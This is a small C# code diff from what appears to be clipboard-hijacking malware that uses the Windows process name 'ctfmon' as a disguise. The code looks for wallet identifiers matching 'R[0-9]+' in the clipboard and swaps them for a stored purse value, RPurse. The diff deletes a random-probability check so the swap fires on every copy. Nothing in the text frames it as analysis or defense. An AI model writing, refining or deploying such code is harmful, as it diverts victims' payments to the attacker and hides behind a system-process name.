@@ -160,8 +160,6 @@ namespace ctfmon
                     }
                     else
                     {
-                        if (rand.Next(0, 100) < configChance)
-                        {
                             if (Regex.IsMatch(data, "r") == true)
                             {
                                 Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse.ToLower()));
@@ -172,7 +170,6 @@ namespace ctfmon
                                 Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse));
                                 pDataPurse = data;
                             }
-                        }
                     }
                 }
 
